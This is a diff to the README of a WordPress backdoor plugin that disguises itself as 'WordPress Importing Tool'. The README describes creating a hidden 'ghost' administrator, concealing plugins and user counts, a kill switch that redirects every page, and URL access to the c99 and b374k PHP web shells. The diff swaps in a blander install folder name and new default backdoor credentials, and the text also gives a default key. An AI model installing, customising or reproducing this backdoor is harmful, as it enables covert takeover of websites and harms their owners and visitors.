@@ -16,7 +16,7 @@ This plugin does the following:
 * Hides said ghost admin user from the WordPress backend area
 * Hides the ghost plugin and all plugins loaded by ghost
 * Hides plugin and user counters
-* Adds a "kill switch” feature to the website that redirects all pages to "purple.com"
+* Adds a "kill switch” feature that redirects all pages to "bummersauce.com"
 * Adds a method to access the c99 & b374k PHP shells via URL
 
 # Installation
@@ -26,15 +26,15 @@ This plugin does the following:
 2. Modify ghost plugin as needed. 
     * The backdoor username, password and key are all stored in the __construct() method of the ghost plugin. 
     * Search for `$this->username =`, `$this->password =`, and `$this->key =` to find the values that need to be updated. 
-3. Upload plugin files to the `/wp-content/plugins/wp-sph/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
+3. Upload plugin files to the `/wp-content/plugins/wp-default/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
 4. Activate the plugin through the 'Plugins' area of the WordPress backend.  It is called `WordPress Importing Tool`
 5. Login as the newly created ghost user.
 
 # Frequently Asked Questions
 
 * **What is the default login of the WordPress ghost admin user?**
-    * Username: WVuIr83XIZ8Zll1
-    * Password: C6oh3K5M9SHuCgQ
+    * Username: Hc462N5M4bP4SMk
+    * Password: K6BJ8V4JE6NeJ6g
 
 * **What is the default key?**
     * jds89f43qmpewqfiopsejaSDJF
